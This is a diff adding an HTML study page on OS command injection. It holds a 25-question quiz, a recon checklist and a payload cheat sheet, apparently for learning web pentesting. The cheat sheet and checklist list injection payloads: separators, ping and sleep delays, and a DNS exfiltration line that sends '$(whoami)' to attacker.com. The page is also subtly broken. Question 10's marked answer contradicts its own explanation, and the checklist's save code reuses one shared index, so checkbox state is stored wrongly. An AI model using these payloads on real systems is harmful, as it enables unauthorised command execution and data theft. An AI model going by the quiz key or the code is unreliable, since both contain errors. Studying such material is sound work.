@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>OS Command Injection — Exam & Recon Kit</title>
+<style>
+:root{
+  --bg:#0d0d0f; --panel:#16161a; --line:#2a2a30;
+  --text:#d0d0d4; --dim:#6a6a74; --accent:#ff2222; --bad:#ff9900;
+  --mono:'JetBrains Mono','Fira Code','Consolas',monospace;
+}
+*{box-sizing:border-box;}
+body{margin:0;background:var(--bg);color:var(--text);font-family:var(--mono);min-height:100vh;}
+.wrap{max-width:720px;margin:0 auto;padding:32px 20px 60px;}
+.tag{color:var(--accent);letter-spacing:.15em;font-size:12px;text-transform:uppercase;font-weight:bold;text-shadow:0 0 5px var(--accent);}
+h1{font-size:22px;margin:6px 0 26px;color:#fff;text-shadow:0 0 8px rgba(255,34,34,0.3);}
+.bar{height:4px;background:var(--line);border-radius:2px;overflow:hidden;margin-bottom:22px;}
+.bar>div{height:100%;background:var(--accent);transition:width .3s;box-shadow:0 0 10px var(--accent);}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:22px;box-shadow:0 0 20px rgba(0,0,0,0.5);}
+.qnum{color:var(--dim);font-size:12px;margin-bottom:10px;}
+.qtext{font-size:16px;color:#fff;margin-bottom:18px;line-height:1.5;}
+.opt{display:block;width:100%;text-align:left;background:#0a0a0d;border:1px solid var(--line);
+  color:var(--text);padding:12px 14px;border-radius:7px;margin-bottom:10px;cursor:pointer;
+  font-family:var(--mono);font-size:13.5px;transition:.15s;}
+.opt:hover{border-color:var(--accent);background:#1a0a0a;box-shadow:0 0 8px rgba(255,34,34,0.2);}
+.opt.correct{background:#2a0a0a;border-color:var(--accent);color:var(--accent);text-shadow:0 0 5px var(--accent);}
+.opt.wrong{background:#2a1a00;border-color:var(--bad);color:var(--bad);text-shadow:0 0 5px var(--bad);}
+.opt[disabled]{cursor:default;}
+.score{color:var(--dim);font-size:13px;}
+.center{text-align:center;}
+.big{font-size:44px;color:var(--accent);margin:10px 0;text-shadow:0 0 15px var(--accent);}
+.btn{background:var(--accent);color:#0d0d0f;border:none;padding:12px 20px;border-radius:7px;
+  font-family:var(--mono);font-weight:bold;cursor:pointer;margin:6px 6px 0 0;font-size:13px;}
+.btn.alt{background:transparent;border:1px solid var(--accent);color:var(--accent);box-shadow:0 0 5px rgba(255,34,34,0.3);}
+.emoji{font-size:26px;position:fixed;top:-30px;animation:fall linear forwards;pointer-events:none;z-index:9999;text-shadow:0 0 10px var(--accent);}
+@keyframes fall{to{transform:translateY(105vh) rotate(360deg);opacity:.2;}}
+h2{color:#fff;font-size:15px;border-bottom:1px solid var(--line);padding-bottom:8px;margin-top:30px;}
+h3{color:var(--accent);font-size:14px;margin-top:20px;margin-bottom:5px;text-shadow:0 0 5px rgba(255,34,34,0.5);}
+.chk{display:flex;gap:10px;align-items:flex-start;padding:8px 0;border-bottom:1px dashed var(--line);font-size:13.5px;}
+.chk input{margin-top:3px;accent-color:var(--accent);}
+.chk.done label{color:var(--dim);text-decoration:line-through;}
+pre{background:#0a0a0d;border:1px solid var(--line);border-radius:7px;padding:12px 14px;
+  overflow-x:auto;font-size:12.5px;color:#ffdddd;margin:8px 0 4px;box-shadow:inset 0 0 10px rgba(0,0,0,0.5);}
+.pname{color:var(--accent);font-size:12.5px;margin-top:16px;}
+#quizView,#kitView{display:none;}
+.explain{margin-top:12px;padding:12px 14px;background:#0a0a0d;border:1px solid var(--line);
+  border-radius:7px;font-size:13px;color:var(--dim);line-height:1.5;display:none;}
+.explain b{color:var(--accent);}
+.topbtn{margin-bottom:18px;}
+#nextBtn{display:none;margin-top:16px;}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="tag">WVAPT // OS Command Injection</div>
+  <h1 id="pageTitle">Concept Check — 25 Questions</h1>
+
+  <div id="quizView">
+    <button class="btn alt topbtn" onclick="showKit()">Skip → Bug Bounty Checklist + Payloads</button>
+    <div class="bar"><div id="prog" style="width:0%"></div></div>
+    <div class="card">
+      <div class="qnum"><span id="qIndex">1</span>/25 &nbsp;·&nbsp; <span class="score">score: <span id="scoreLive">0</span></span></div>
+      <div class="qtext" id="qText"></div>
+      <div id="opts"></div>
+      <div class="explain" id="explain"></div>
+      <button class="btn" id="nextBtn" onclick="goNext()">Next →</button>
+    </div>
+  </div>
+
+  <div id="doneView" class="card center" style="display:none;">
+    <div class="tag">Result</div>
+    <div class="big"><span id="finalScore">0</span>/25</div>
+    <div id="finalMsg" style="color:var(--dim);margin-bottom:16px;"></div>
+    <button class="btn" onclick="restart()">Retake Exam</button>
+    <button class="btn alt" onclick="showKit()">Bug Bounty Checklist + Payloads →</button>
+  </div>
+
+  <div id="kitView">
+    <button class="btn alt" onclick="showQuiz()">← Back to Exam</button>
+
+    <h2>Recon Checklist</h2>
+    <div id="checklist"></div>
+
+    <h2>Payload Cheatsheet</h2>
+    <div id="payloads"></div>
+  </div>
+</div>
+
+<script>
+const Q=[
+["What is the primary cause of OS Command Injection?",["User input inserted into OS commands without proper validation","Weak password policies implemented on the target server locally","Missing HTTPS encryption on the web application layer securely","Database queries executed without proper indexes on the server"],0,
+"It occurs when user-controlled input is concatenated directly into a system command without sanitization."],
+["Which component actually executes the injected command?",["The underlying operating system shell directly","The frontend web browser engine locally","The backend relational database server","The reverse proxy load balancer node"],0,
+"The web server passes the command to the OS shell (like bash or cmd) which executes it natively."],
+["Why do developers sometimes execute OS commands?",["To perform system-level tasks like file conversion","To securely store user session cookies locally","To encrypt passwords using strong algorithms","To create temporary database tables quickly"],0,
+"Developers use shell commands for convenience when interacting with the OS, often introducing critical flaws."],
+["Which symbol commonly separates commands on both Windows and Linux?",["The ampersand symbol (&) safely","The hashtag symbol (#) securely","The at the rate symbol (@) now","The colon symbol (:) directly"],0,
+"The ampersand (&) runs commands sequentially on both Windows and Linux shells."],
+["What does the && operator do?",["Executes next command only if previous succeeds","Executes all commands simultaneously in parallel","Redirects standard output to a specific local file","Creates a background process hidden from users"],0,
+"The logical AND operator (&&) ensures the second command runs only if the first exits without errors."],
+["Why is echo commonly used during testing?",["It prints a unique string to confirm execution","It automatically encrypts the transmitted data","It creates hidden files on the target server","It sends malicious DNS requests externally"],0,
+"Echoing a unique string verifies that command execution is possible and the output is visible."],
+["Why should the echoed string be unique?",["To avoid false positives in the HTTP response","To significantly increase the application speed","To easily bypass the network firewall rules","To encrypt the command output payload safely"],0,
+"A unique string ensures the output isn't confused with existing text on the page."],
+["Blind OS Command Injection means:",["Commands execute but no output is shown to attacker","Commands execute only on Windows operating systems","Commands execute only on Linux operating systems","The target server crashes immediately upon execution"],0,
+"In blind scenarios, the command runs but the application does not return the output in the response."],
+["Which technique is commonly used to detect Blind OS Command Injection?",["Time delay using the ping command directly","Complex SQL queries injected into the database","File Transfer Protocol uploads to the server","JavaScript alert boxes executed in browser"],0,
+"Using ping to introduce a measurable delay in the server response confirms blind execution."],
+["Which Linux command is commonly used for a time-delay test?",["The ping -c 10 127.0.0.1 command safely","The sleep 10 command locally now directly","The dir command on the system securely","The ver command on the server safely"],1,
+"According to the material, ping -c 10 127.0.0.1 is used to introduce a 10-second delay on Linux."],
+["Which Windows command is commonly used for a time-delay test?",["The ping -n 10 127.0.0.1 command now","The uname -a command on the system safely","The ls -la command on the server securely","The pwd command on the directory directly"],0,
+"On Windows, ping -n 10 127.0.0.1 sends 10 requests, causing a measurable time delay."],
+["What does the > operator do?",["Redirects command output into a specified file","Runs multiple commands simultaneously in parallel","Executes commands only if the previous succeeds","Performs external DNS lookups for the domain"],0,
+"The greater-than sign (>) redirects standard output into a file instead of the screen."],
+["Which blind technique stores command output in a publicly accessible file?",["The File Output Redirection technique locally","The Time Delay execution technique safely","The SQL Injection execution technique fully","The Cross-Site Scripting technique entirely"],0,
+"Redirecting output to a web root directory allows the attacker to read it via the browser."],
+["What does OAST stand for?",["Out-of-Band Application Security Testing","Open Authentication Security Test suite","Operating Application Security Tool software","Online Attack Simulation Test environment"],0,
+"OAST detects vulnerabilities by observing out-of-band interactions like DNS or HTTP requests."],
+["Which command is commonly used during OAST testing?",["The nslookup command for DNS requests","The mkdir command for directory creation","The touch command for file generation","The cat command for reading files"],0,
+"nslookup or similar DNS tools are used to trigger a callback to the attacker's OAST server."],
+["What do backticks ( `command` ) do?",["Execute the enclosed command and substitute output","Redirect the command output into a local file","Create a new hidden file on the target system","Delete existing files on the server completely"],0,
+"Backticks execute the command inside them and return the output to be used by another command."],
+["Which syntax provides modern command substitution in Linux?",["The $(command) syntax structure safely","The %(command) syntax structure locally","The @(command) syntax structure fully","The #(command) syntax structure now"],0,
+"The $() syntax is the modern, preferred way to execute commands and substitute their output."],
+["Which feature is most likely to contain an OS Command Injection vulnerability?",["A network ping utility executing system calls","A standard user login authentication form","A new user registration submission page","A public blog comment section submission"],0,
+"Features that interact with the OS, like ping or DNS lookups, are prime targets for this flaw."],
+["Which is the best way to prevent OS Command Injection?",["Using safe APIs and strict input whitelisting","Blacklisting dangerous characters from user input","Base64 encoding all user input data safely","Hiding backend server error messages entirely"],0,
+"Using built-in safe APIs that parameterize commands is far superior to blacklisting characters."],
+["Which statement best describes OS Command Injection?",["It allows attackers to execute operating system commands","It allows attackers to inject SQL queries directly","It steals browser cookies from the victim directly","It only affects Windows servers running IIS"],0,
+"It is the direct execution of unauthorized operating system commands on the host server."],
+["Which shell operator runs the second command only if the first fails?",["The || operator sequence in the shell","The && operator sequence in the shell","The & operator sequence in the shell","The ; operator sequence in the shell"],0,
+"The logical OR operator (||) executes the next command only if the previous one returns an error."],
+["Which separator is primarily Unix/Linux-only according to the study material?",["The semicolon (;) separator character safely","The ampersand (&) separator character locally","The logical OR (||) separator character now","The logical AND (&&) separator character fully"],0,
+"The semicolon (;) separates commands on Linux but is not a valid separator on Windows cmd."],
+["Which technique confirms command execution without visible output or writable files?",["The OAST (DNS) technique securely","The File Redirection technique locally","The Echo Output technique directly","The Sleep Command technique entirely"],0,
+"OAST confirms execution by triggering an external network interaction observable by the attacker."],
+["What is the very first indicator that an application might be vulnerable?",["It performs system tasks like ping or file conversion","It stores user passwords in plaintext locally","It uses HTTPS encryption for all traffic","It uses cookies for session management"],0,
+"Any feature that seems to interact with the operating system is a primary suspect for testing."],
+["What is the fundamental vulnerability behind OS Command Injection?",["User-controlled input reaches the OS shell unsanitized","Cross-Origin Resource Sharing misconfiguration","Weak encryption algorithms on the server","Missing Content Security Policy headers"],0,
+"The root cause is failing to separate user data from executable OS commands."]
+];
+
+const CHECKLIST_DATA = [
+  { title: "1. Initial Recon", items: [
+    "Identify features taking system input (ping utilities, DNS lookups, file conversions).",
+    "Test basic separators: <code>&</code>, <code>;</code>, <code>|</code>, <code>&&</code>, <code>||</code>."
+  ]},
+  { title: "2. Visible Injection (Echo)", items: [
+    "Inject <code>123abc</code> using separators to confirm execution.",
+    "Verify the unique string is reflected in the HTTP response to avoid false positives."
+  ]},
+  { title: "3. Blind Time-Delay", items: [
+    "Linux: Inject <code>; ping -c 10 127.0.0.1 ;</code> or <code>& sleep 10 &</code>.",
+    "Windows: Inject <code>& ping -n 10 127.0.0.1 &</code>.",
+    "Measure response time to confirm a 10-second delay indicating execution."
+  ]},
+  { title: "4. Blind OAST (Out-of-Band)", items: [
+    "Generate a Burp Collaborator domain.",
+    "Inject <code>& nslookup attacker.com &</code> or <code>| nslookup attacker.com |</code>.",
+    "Check Collaborator for incoming DNS requests confirming blind execution."
+  ]},
+  { title: "5. Redirection & Substitution", items: [
+    "Redirect output to web root: <code>> /var/www/html/out.txt</code>.",
+    "Use modern substitution: <code>$(whoami)</code> or backticks <code>`whoami`</code>.",
+    "Ensure safe APIs and strict input whitelisting are recommended for remediation."
+  ]}
+];
+
+const PAYLOADS = [
+  { name: "1. Command Separators", code: "& echo 123\n; echo 123\n| echo 123\n&& echo 123\n|| echo 123" },
+  { name: "2. Time Delay (Linux)", code: "& ping -c 10 127.0.0.1 &\n& sleep 10 &" },
+  { name: "3. Time Delay (Windows)", code: "& ping -n 10 127.0.0.1 &" },
+  { name: "4. OAST Exfiltration", code: "& nslookup attacker.com &\n& nslookup $(whoami).attacker.com &" },
+  { name: "5. Command Substitution", code: "$(whoami)\n`whoami`" }
+];
+
+let cur=0,score=0;
+
+function shuffle(a){for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];}return a;}
+
+function renderQ(){
+  document.getElementById('prog').style.width=(cur/Q.length*100)+'%';
+  document.getElementById('qIndex').textContent=cur+1;
+  document.getElementById('scoreLive').textContent=score;
+  const [text,opts,correctIdx,why]=Q[cur];
+  document.getElementById('qText').textContent=text;
+  const exp=document.getElementById('explain');
+  exp.style.display='none';exp.innerHTML='';
+  let arr=opts.map((o,i)=>({o,correct:i===correctIdx}));
+  shuffle(arr);
+  const box=document.getElementById('opts');
+  box.innerHTML='';
+  arr.forEach(item=>{
+    const b=document.createElement('button');
+    b.className='opt';b.textContent=item.o;
+    b.onclick=()=>pick(b,item.correct,box,item.o,why,arr);
+    box.appendChild(b);
+  });
+  document.getElementById('nextBtn').style.display='none';
+}
+
+function pick(btn,isCorrect,box,pickedText,why,arr){
+  [...box.children].forEach(c=>c.disabled=true);
+  const exp=document.getElementById('explain');
+  if(isCorrect){
+    btn.classList.add('correct');score++;
+    exp.innerHTML=`<b>Correct.</b> ${why}`;
+  }else{
+    btn.classList.add('wrong');
+    const correctText=arr.find(a=>a.correct).o;
+    [...box.children].forEach(c=>{if(c.textContent===correctText)c.classList.add('correct');});
+    exp.innerHTML=`<b>Correct answer:</b> ${correctText}<br>${why}`;
+  }
+  exp.style.display='block';
+  document.getElementById('scoreLive').textContent=score;
+  const nb=document.getElementById('nextBtn');
+  nb.style.display='inline-block';
+  nb.textContent=(cur+1<Q.length)?'Next →':'See Results →';
+}
+
+function goNext(){
+  cur++;
+  if(cur<Q.length)renderQ();else finish();
+}
+
+function finish(){
+  document.getElementById('prog').style.width='100%';
+  document.getElementById('quizView').style.display='none';
+  document.getElementById('doneView').style.display='block';
+  document.getElementById('finalScore').textContent=score;
+  const msg=score===Q.length?"ROOT ACCESS GRANTED. Shell fully compromised.":
+    score>=20?"Solid grasp — revisit the weak spots.":
+    score>=15?"Halfway there — reread the tricky sections.":
+    "Go back through the concept steps before diving into labs.";
+  document.getElementById('finalMsg').textContent=msg;
+  if(score===Q.length) confetti();
+}
+
+function confetti(){
+  const em=['⌨️','💻','🐧','🪟','🖥️','🔥'];
+  for(let i=0;i<30;i++){
+    setTimeout(()=>{
+      const s=document.createElement('div');
+      s.className='emoji';s.textContent=em[Math.floor(Math.random()*em.length)];
+      s.style.left=Math.random()*100+'vw';
+      s.style.animationDuration=(2+Math.random()*1.5)+'s';
+      document.body.appendChild(s);
+      setTimeout(()=>s.remove(),4000);
+    },i*60);
+  }
+}
+
+function restart(){
+  cur=0;score=0;
+  document.getElementById('doneView').style.display='none';
+  document.getElementById('kitView').style.display='none';
+  document.getElementById('quizView').style.display='block';
+  document.getElementById('pageTitle').textContent='Concept Check — 25 Questions';
+  renderQ();
+}
+
+let cameFromDone=false;
+function showKit(){
+  cameFromDone=document.getElementById('doneView').style.display==='block';
+  document.getElementById('doneView').style.display='none';
+  document.getElementById('quizView').style.display='none';
+  document.getElementById('kitView').style.display='block';
+  document.getElementById('pageTitle').textContent='Bug Bounty Recon Kit';
+}
+function showQuiz(){
+  document.getElementById('kitView').style.display='none';
+  if(cameFromDone){
+    document.getElementById('doneView').style.display='block';
+  }else{
+    document.getElementById('quizView').style.display='block';
+  }
+  document.getElementById('pageTitle').textContent='Concept Check — 25 Questions';
+}
+
+function buildChecklist(){
+  const c=document.getElementById('checklist');
+  const saved=JSON.parse(localStorage.getItem('cmdi_cyber_v1')||'{}');
+  let html='';
+  let idx=0;
+  CHECKLIST_DATA.forEach(section => {
+    html += `<h3>${section.title}</h3>`;
+    section.items.forEach(item => {
+      const isChecked = saved[idx] ? 'checked' : '';
+      const isDone = saved[idx] ? ' done' : '';
+      html += `<div class="chk${isDone}">
+        <input type="checkbox" id="c${idx}" ${isChecked}>
+        <label for="c${idx}">${item}</label>
+      </div>`;
+      idx++;
+    });
+  });
+  c.innerHTML = html;
+  
+  idx=0;
+  CHECKLIST_DATA.forEach(section => {
+    section.items.forEach(item => {
+      const checkbox = document.getElementById(`c${idx}`);
+      const row = checkbox.parentElement;
+      checkbox.onchange = e => {
+        saved[idx] = e.target.checked;
+        localStorage.setItem('cmdi_cyber_v1', JSON.stringify(saved));
+        row.classList.toggle('done', e.target.checked);
+      };
+      idx++;
+    });
+  });
+}
+
+function buildPayloads(){
+  const p=document.getElementById('payloads');
+  let html='';
+  const esc = s => s.replace(/</g, '&lt;').replace(/>/g, '&gt;'); // Prevent live HTML execution
+  PAYLOADS.forEach(item => {
+    html += `<div class="pname">${item.name}</div><pre>${esc(item.code)}</pre>`;
+  });
+  p.innerHTML = html;
+}
+
+document.getElementById('quizView').style.display='block';
+renderQ();
+buildChecklist();
+buildPayloads();
+</script>
+</body>
+</html>
